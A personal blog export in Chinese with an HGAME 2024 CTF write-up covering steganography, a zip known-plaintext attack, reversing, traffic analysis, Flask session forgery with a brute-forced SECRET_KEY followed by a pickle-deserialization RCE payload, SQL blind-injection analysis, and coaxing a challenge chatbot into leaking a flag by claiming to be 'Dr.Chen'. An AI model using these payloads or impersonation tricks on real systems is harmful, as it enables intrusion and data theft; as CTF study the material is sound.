title="misc"></a>misc</h2><h3 id="1-来自星尘的问候"><a href="#1-来自星尘的问候" class="headerlink" title="1.来自星尘的问候"></a>1.来自星尘的问候</h3><p><img src="/img/Hgame2024/Week1/secret.jpg"></p><p>题目描述里提到了六位弱加密，应该就是用的steghide用六位密码搞的隐写，所以放进脚本里分离一下，爆破密码之前试了123456结果直接就成功了，获得了隐藏的压缩包，里面有一张奇怪的图片。</p><p><img src="/img/Hgame2024/Week1/3.png"></p><p><img src="/img/Hgame2024/Week1/4.png"></p><p>再根据题目里说的官网上找相关文字，就可以去一个个对应翻译。但更方便的是直接搜网上对这个文字的分析。然后又发现网上有人指出可以去官网扒woff2文件(<a href="https://g.nga.cn/read.php?tid=39109851&amp;rand=99">https://g.nga.cn/read.php?tid=39109851&amp;rand=99</a>)，跟大小写字母和数字逐一对应就好了。</p><p><img src="/img/Hgame2024/Week1/5.png"></p><h3 id="2-simple-attack"><a href="#2-simple-attack" class="headerlink" title="2.simple_attack"></a>2.simple_attack</h3><p>压缩包解密题，里面一张图片加另一个压缩包，包中包里有一个加密过的跟外面一样的图片（放Bandizip里看crc一致且命名一致）和加密过的txt，压缩算法都是ZipCrypto，那基本就是明文攻击的题型了。</p><p><img src="/img/Hgame2024/Week1/6.png" alt="最外层压缩包内容"></p><p><img src="/img/Hgame2024/Week1/7.png" alt="内层压缩包attachment.zip内容"></p><p>所以把外面的那张未加密图片按压缩算法ZipCrypto压缩，其他项也要与压缩包内加密的图片一致，压缩级别逐个试过来就是正常压缩，然后放到ARCHPR里明文攻击，得到解密后的attachment压缩包。</p><p><img src="/img/Hgame2024/Week1/8.png"></p><p>打开photo.txt里面是Data URI scheme的格式，放到浏览器地址栏里就可以查看图片，得到flag。</p><p><img src="/img/Hgame2024/Week1/9.png"></p><h3 id="3-希儿希儿希尔"><a href="#3-希儿希儿希尔" class="headerlink" title="3.希儿希儿希尔"></a>3.希儿希儿希尔</h3><p>拿到手是一个不能正常显示的图片，题目说需要修复，所以在010Editor检查了一下，图片格式没有问题，但在末尾有secret.txt和PK，说明图里藏有压缩包，直接改了拓展名，拿到压缩包里的txt文件。但没法直接解密，暂时还不知道有什么用。</p><p><img src="/img/Hgame2024/Week1/10.png"></p><p><img src="/img/Hgame2024/Week1/11.png"></p><p>然后想把它放进Stegsolve里看看，结果打不开，看来应该是宽高被修改，需要crc校验。于是到python脚本里跑出正常宽高并在010Editor修改，得到希儿的正常图片。</p><p><img src="/img/Hgame2024/Week1/12.png"></p><p>接下来就可以在Stegsolve里正常打开，顺便检查了一下属性没什么问题，但发现了LSB隐写藏着可疑的数据。</p><p><img src="/img/Hgame2024/Week1/13.png"></p><p>因为一开始没有好好看题，结果始终不知道这个到底是怎么用的，甚至后来以为这里只是我多想了转而去尝试其他隐写，直到我又看了一遍题：题目名字“希儿希儿希尔”最后一个是“希尔”且“不过他似乎忘了这个加密的名字不是希儿了”，也就是说题目已经给出提示，去网上一搜“希尔加密”还真有，然后在<a href="https://ctf.bugku.com/tool/hill">Bugku</a>解决。</p><h2 id="reverse"><a href="#reverse" class="headerlink" title="reverse"></a>reverse</h2><p>这部分因为第一周的简单就尝试了一下。</p><h3 id="1-ezASM"><a href="#1-ezASM" class="headerlink" title="1.ezASM"></a>1.ezASM</h3><p>一开始去临时学习了一下汇编知识，后来感觉没必要，像C语言理解应该就可以，于是把上面c里的数和0x22异或一下，ASCII转文字就是flag了。</p><p><img src="/img/Hgame2024/Week1/14.png"></p><h3 id="2-ezUPX"><a href="#2-ezUPX" class="headerlink" title="2.ezUPX"></a>2.ezUPX</h3><p>如题，是个UPX，所以先用upx去壳即可。</p><p><img src="/img/Hgame2024/Week1/15.png"></p><p><img src="/img/Hgame2024/Week1/16.png"></p><p>输入的flag要与0x32异或后等于byte_1400022A0的内容，所以找到并异或回去就得到flag。（新学的快捷键shift+e导出这些文本）</p><p><img src="/img/Hgame2024/Week1/17.png"></p><p><img src="/img/Hgame2024/Week1/18.png"></p><h1 id="Week2"><a href="#Week2" class="headerlink" title="Week2"></a>Week2</h1><h2 id="misc-1"><a href="#misc-1" class="headerlink" title="misc"></a>misc</h2><h3 id="1-ek1ng-want-girlfriend"><a href="#1-ek1ng-want-girlfriend" class="headerlink" title="1.ek1ng_want_girlfriend"></a>1.ek1ng_want_girlfriend</h3><p>流量分析题，是对Wireshark使用（和ek1ng）的初步介绍，流量文件中发现一张ek1ng.jpg的图片，将其导出，图片是ek1ng的照片和flag。</p><p><img src="/img/Hgame2024/Week2/1.png"></p><p><img src="/img/Hgame2024/Week2/2.png"></p><p><img src="/img/Hgame2024/Week2/3.png"></p><h3 id="2-ezWord"><a href="#2-ezWord" class="headerlink" title="2.ezWord"></a>2.ezWord</h3><p>下载一个attachment.zip，里面“这是一个word文件.docx”，打开是“你好，这个文件的内部有你想要的”和一张图片。大概是文档加密，把文档放进010Editor，发现PK字样，说明内部藏有压缩包。改为zip后缀并解压，发现两张看起来一样的图片“100191209_p0.jpg”“image1.png”和secret.zip（打开是加密的secret.txt和直接可读的提示“你好，很高兴你看到了这个压缩包。请注意：这个压缩包的密码有11位数而且包含大写字母小写字母和数字。还有一个要注意的是，里面的这一堆英文decode之后看上去是一堆中文乱码实际上这是正常现象，如果看到它们那么你就离成功只差一步了。”）根据题目描述“破译图片的水印”可以知道考点大概率是图片盲水印，两张照片一张是原图一张是打水印后的图，而压缩包的密码应该就是水印内容。因此用github上的“bwmforpy3.py”处理。</p><p><img src="/img/Hgame2024/Week2/4.png"></p><p>在处理后得到的“fan_bwm.png”中得到压缩包密码。打开secret.txt，里面是有些莫名其妙的疑似邮件内容，我一开始还以为是把信息隐藏在文本中，后来直接放到搜索引擎搜发现有一种加密方法加密后的结果刚好相似<a href="https://www.spammimic.com/decode.cgi">https://www.spammimic.com/decode.cgi</a>。</p><p><img src="/img/Hgame2024/Week2/5.png"></p><p>得到解密结果，还差最后一层加密。根据提示Unicode（感觉不提示真想不到），查看这些中文乱码的Unicode编码。</p><p><img src="/img/Hgame2024/Week2/6.png"></p><p>再看看hgame的编码。</p><p><img src="/img/Hgame2024/Week2/7.png"></p><p>前几个字符一一对应，发现都刚好相差31753，说明这段中文是flag经过Unicode编码的偏移的结果。所以用python把他们都处理一下得到flag。</p><p><img src="/img/Hgame2024/Week2/8.png"></p><p><img src="/img/Hgame2024/Week2/9.png"></p><h2 id="web-1"><a href="#web-1" class="headerlink" title="web"></a>web</h2><h3 id="1-myflask（当时没完成，事后发现就差一点点点点……呜呜呜）"><a href="#1-myflask（当时没完成，事后发现就差一点点点点……呜呜呜）" class="headerlink" title="1.myflask（当时没完成，事后发现就差一点点点点……呜呜呜）"></a>1.myflask（当时没完成，事后发现就差一点点点点……呜呜呜）</h3><p>一进入就把后端的app.py发了过来。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> pickle<br><span class="hljs-keyword">import</span> base64<br><span class="hljs-keyword">from</span> flask <span class="hljs-keyword">import</span> Flask, session, request, send_file<br><span class="hljs-keyword">from</span> datetime <span class="hljs-keyword">import</span> datetime<br><span class="hljs-keyword">from</span> pytz <span class="hljs-keyword">import</span> timezone<br><br>currentDateAndTime = datetime.now(timezone(<span class="hljs-string">&#x27;Asia/Shanghai&#x27;</span>))<br>currentTime = currentDateAndTime.strftime(<span class="hljs-string">&quot;%H%M%S&quot;</span>)<br><br>app = Flask(__name__)<br><span class="hljs-comment"># Tips: Try to crack this first ↓</span><br>app.config[<span class="hljs-string">&#x27;SECRET_KEY&#x27;</span>] = currentTime<br><span class="hljs-built_in">print</span>(currentTime)<br><br><span class="hljs-meta">@app.route(<span class="hljs-params"><span class="hljs-string">&#x27;/&#x27;</span></span>)</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">index</span>():<br>    session[<span class="hljs-string">&#x27;username&#x27;</span>] = <span class="hljs-string">&#x27;guest&#x27;</span><br>    <span class="hljs-keyword">return</span> send_file(<span class="hljs-string">&#x27;app.py&#x27;</span>)<br><br><span class="hljs-meta">@app.route(<span class="hljs-params"><span class="hljs-string">&#x27;/flag&#x27;</span>, methods=[<span class="hljs-string">&#x27;GET&#x27;</span>, <span class="hljs-string">&#x27;POST&#x27;</span>]</span>)</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">flag</span>():<br>    <span class="hljs-keyword">if</span> <span class="hljs-keyword">not</span> session:<br>        <span class="hljs-keyword">return</span> <span class="hljs-string">&#x27;There is no session available in your client :(&#x27;</span><br>    <span class="hljs-keyword">if</span> request.method == <span class="hljs-string">&#x27;GET&#x27;</span>:<br>        <span class="hljs-keyword">return</span> <span class="hljs-string">&#x27;You are &#123;&#125; now&#x27;</span>.<span class="hljs-built_in">format</span>(session[<span class="hljs-string">&#x27;username&#x27;</span>])<br>    <br>    <span class="hljs-comment"># For POST requests from admin</span><br>    <span class="hljs-keyword">if</span> session[<span class="hljs-string">&#x27;username&#x27;</span>] == <span class="hljs-string">&#x27;admin&#x27;</span>:<br>        pickle_data=base64.b64decode(request.form.get(<span class="hljs-string">&#x27;pickle_data&#x27;</span>))<br>        <span class="hljs-comment"># Tips: Here try to trigger RCE</span><br>        userdata=pickle.loads(pickle_data)<br>        <span class="hljs-keyword">return</span> userdata<br>    <span class="hljs-keyword">else</span>:<br>        <span class="hljs-keyword">return</span> <span class="hljs-string">&#x27;Access Denied&#x27;</span><br> <br><span class="hljs-keyword">if</span> __name__==<span class="hljs-string">&#x27;__main__&#x27;</span>:<br>    app.run(debug=<span class="hljs-literal">True</span>, host=<span class="hljs-string">&quot;0.0.0.0&quot;</span>)<br><br></code></pre></td></tr></table></figure><p>研究一下代码，在进入‘&#x2F;’时将客户端的session内username内容设为guest并返回app.py。在进入‘&#x2F;flag’时有session的前提下若为get方法则显示当前的username，当username等于admin时读取post方法传递的pickle_data并base64解码，然后用pickle.loads()函数反序列化存储至userdata并返回。所以大致的思路就是伪造session使自己的username&#x3D;admin，然后以pickle反序列化触发RCE。而session伪造的前提是对原session解码修改并得到SECRET_KEY。解码session用网上找的脚本跑一下就好，正是<code>&#123;&#39;username&#39;: &#39;admin&#39;&#125;</code>。SECRET_KEY如何获得则看代码中app.config[‘SECRET_KEY’]&#x3D;currentTime，而currentTime等于某个按%H%M%S格式的时间，因此我们可以尝试写一个字典爆破SECRET_KEY。</p><p><img src="/img/Hgame2024/Week2/10.png"></p><p><img src="/img/Hgame2024/Week2/11.png"></p><p>用flask-unsign爆破。</p><p><img src="/img/Hgame2024/Week2/12.png"></p><p>得到SECRET_KEY然后修改guest为admin并伪造session即可。然后放入cookie发送，成功。</p><p><img src="/img/Hgame2024/Week2/13.png"></p><p><img src="/img/Hgame2024/Week2/14.png"></p><p>然后就是尝试通过pickle反序列化触发RCE了，先是傻傻去查看app.py所在目录然后突然想起来在错误传参使之报错时已经显示了文件目录，又去看了看app.py所在目录下的文件发现只有这个，然后想看看上级目录下的文件，不知道为啥（可能用错函数了）结果返回为空。最后因为出门在外没法做题导致时间不足来不及截止前做完T^T</p><p>后来：</p><p>重新尝试，构造payload的程序如下</p><figure class="highlight clean"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs clean"><span class="hljs-keyword">import</span> pickle<br><span class="hljs-keyword">import</span> urllib<br><span class="hljs-keyword">from</span> base64 <span class="hljs-keyword">import</span> b64encode<br><br><span class="hljs-keyword">class</span> payload(object):<br>def __reduce__(self):<br>return (eval, (<span class="hljs-string">&quot;open(&#x27;/flag&#x27;).read()&quot;</span>,))<br>###原本这里也写的/flag.txt的，看完wp后删了txt试了试发现可以！啊啊啊啊啊啊啊啊啊啊啊啊！！！！！痛苦！！！！！！！！！！！###<br><br>a = pickle.dumps(payload(),protocol=<span class="hljs-number">0</span>)<br>print(b64encode(a).decode())<br></code></pre></td></tr></table></figure><p>这段语句本质上就是构造<code>__reduce__</code>魔术方法，然后将要执行的命令pickle序列化，再base64加密处理，最后把输出的结果贴到<code>pickle_data=</code>后面post传参即可。（其实就是把前面分析出来的app.py的处理过程反过来）</p><p><img src="/img/Hgame2024/Week2/15.png" alt="最后成功了。"></p><p>对于其他小细节的研究：</p><pre><code class="hljs">eyJ1c2VybmFtZSI6Imd1ZXN0In0.ZcteaQ.c9lMyjsOph-sEkwoxMqB9TzqwwAeyJ1c2VybmFtZSI6Imd1ZXN0In0.Zcthhg.ijiHa85G3dwoCC08Wlk6koLtEiI</code></pre><p>尝试对比后中间段时间戳刷新就变，与服务器最新数据的时间有关。</p><pre><code class="hljs">&#39;SECRET_KEY&#39;=203048</code></pre><p>尝试刷新后用新session爆破key，还是不变的。但启用新靶机就不一样了，说明app.py里所获取并赋值给SECRET_KEY的时间是靶机开启时间。</p><h1 id="Week3"><a href="#Week3" class="headerlink" title="Week3"></a>Week3</h1><h2 id="misc-2"><a href="#misc-2" class="headerlink" title="misc"></a>misc</h2><h3 id="1-与ai聊天"><a href="#1-与ai聊天" class="headerlink" title="1.与ai聊天"></a>1.与ai聊天</h3><p>一道简单AI题，题目描述让我们从AI嘴里“翘出”flag，如图：</p><p><img src="/img/Hgame2024/Week3/1.png"></p><p>当问AI flag的时候“But first,could you please tell me your name?”猜测AI会根据身份的判断选择给不给flag，因此说admin作为尝试，但AI表示他不能提供flag。</p><p><img src="/img/Hgame2024/Week3/2.png"></p><p>于是猜测admin应该不是正确身份，但我还是谴责了AI，没想到他一边道歉一边就说漏嘴了，他只能提供flag给Dr.Chen，换个身份flag到手。</p><h3 id="2-Blind-SQL-Injection"><a href="#2-Blind-SQL-Injection" class="headerlink" title="2.Blind SQL Injection"></a>2.Blind SQL Injection</h3><p>对SQL盲注的流量分析，先用http作为过滤器筛选，按时间顺序排序，这样前一个是发送到靶机的请求，后一个跟的就是相应的服务器的响应。</p><p><img src="/img/Hgame2024/Week3/3.png"></p><p>先大致了解这里用到的语法，ascii(x)函数就是将字符x转ASCII码，substr(a,b,c)函数就是截取a字符串从b处起长度为c的部分，reverse()函数则是将字符串倒转，group_concat()函数将组中的字符串连接成为具有各种选项的单个字符串。</p><p>再看注入的内容。图中substr(…,33,1)就相当于提取第33位字符用于操作。“%3E”按十六进制ASCII码即为“&gt;”，“%3E”前面的部分ascii()函数将“F1naI1y”中SQL注入者想获得的内容第33位转为ASCII码，推测得“%3E”后的数则是SQL注入者所猜测的字符的ASCII码。这里用的是布尔盲注，SQL注入者要结合回显判断猜测是否正确。当所求内容的ASCII码&gt;猜测的ASCII码即id&#x3D;1-1&#x3D;0时，回显“ERROR!!!”；当所求内容的ASCII码&lt;&#x3D;猜测的ASCII码即id&#x3D;1-0&#x3D;1时，回显“NO! Not this! Click others~~~”，也就是说找到回显为“NO! Not this! Click others~~~”的最小ASCII码即为该位的内容。要获得完整内容就把每一位（指substr(…,n,1)）拼接起来。下图是本题中的两种响应：</p><p><img src="/img/Hgame2024/Week3/4.png"></p><p><img src="/img/Hgame2024/Week3/5.png"></p><p>而整个流量文件中SQL的注入分为四个部分：</p><p>第一部分是获取数据库名称（table_schema），按上述方法分析得数据库名称geek。</p><p><img src="/img/Hgame2024/Week3/6.png"></p><p>第二部分是获取geek数据库中的表名（table_name），分析得表名F1naI1y。</p><p><img src="/img/Hgame2024/Week3/7.png"></p><p>第三部分获取F1naI1y表中的列名（column_name），分析得可用列名password。</p><p><img src="/img/Hgame2024/Week3/8.png"></p><p>第四部分获取password列中数据，这里面大概就是我们要找的flag了。同理分析可得flag{cbabafe7-1725-4e98-bac6-d38c5928af2f}（因为reverse()函数，按时间顺序得到的是倒过来的内容，倒回来就是flag）。</p><p><img src="/img/Hgame2024/Week3/9.png"></p><p>最后总分位列第23名，1540分，再接再励！</p>]]></content>
    
    
    <categories>
      
      <category>CTF</category>
      
    </categories>
    
    
    <tags>
      
      <tag>CTF</tag>
      
      <tag>web</tag>
      
      <tag>misc</tag>
      
      <tag>reverse</tag>
      
      <tag>WriteUp</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Hello World!</title>
    <link href="/2024/05/04/hello-world/"/>
    <url>/2024/05/04/hello-world/</url>
    
    <content type="html"><![CDATA[<p>Hello ! New world !</p><h2 id="Hello"><a href="#Hello" class="headerlink" title="Hello !"></a>Hello !</h2><h3 id="This-is-my-first-post"><a href="#This-is-my-first-post" class="headerlink" title="This is my first post !"></a>This is my first post !</h3><p>这篇“文章”算是我自从开始学习web相关内容的第一篇Blog，也是搭成个人博客网站的第一篇Blog，更是人生中的第一篇Blog。写这样的“第一篇”用以纪念下一段未来的开始。</p><h3 id="The-end-The-beginning-！"><a href="#The-end-The-beginning-！" class="headerlink" title="The end ? The beginning ！"></a>The end ? The beginning ！</h3><p>作为一个web技术的小白，搭成这样的博客对先前的我来说都是一个值得重视的坎（当然，现在还是菜，也不会认为不值得^V^），但是，当这个目标在我拖拖拉拉地实现后也绝对不会变成终点，而应当是我学习之路的新起点，就像是许多编程语言的第一句“Hello World!”一般，我把这当做是我的开始。</p><p>然而，学习终归是一件快乐与痛苦并存的事情，我的一些问题或许仍会阻挡我学习的脚步。一是学习的信心，有些时候会遇到难以解决的问题而陷入无助和失望，随后便是搁置一旁。当然，大家都知道这是正常的，我也希望我在未来能够适当地放弃但不懈地追求。二是这慢吞吞的学习速度，总是羡慕一些学长大佬和身边同龄大佬的学习能力，给我一种望尘莫及的感觉。或许也是因为时间的分配不够合理，一些琐屑的杂事总能让我对web的学习产生一种心有余而力不足的感觉，许多事情都过于认真，使得真正重要的没有足够的时间。但愿日后能及时地改变，追上大佬们前进的脚步！</p><h2 id="About-my-Blog"><a href="#About-my-Blog" class="headerlink" title="About my Blog"></a>About my Blog</h2><h3 id="To-visitors"><a href="#To-visitors" class="headerlink" title="To visitors :"></a>To visitors :</h3><p>感谢你看到了这里！‧★,:*:‧(￣▽￣)&#x2F;‧:<em>‧°★</em>　 </p><p>我的博客内容将包括但不限于我的web学习历程、CTF经历，也可能会分享我的生活、我的思想。总而言之，欢迎每一位来访的朋友，欢迎你们的交流和指点！共同学习，共同进步！</p><p>Keep going !</p><p><img src="/img/wallhaven-l8vp7y.jpg"></p><blockquote><p><em><p style="text-align:center"><span  style="font-size:1.0em;">我期望有一天，能遇见一个人、一件事，让我为之着迷。</span></p></em></p></blockquote>]]></content>
    
    
    <categories>
      
      <category>others</category>
      
    </categories>
    
    
    <tags>
      
      <tag>I&#39;m...</tag>
      
    </tags>
    
  </entry>
  
  
  
  
</search>
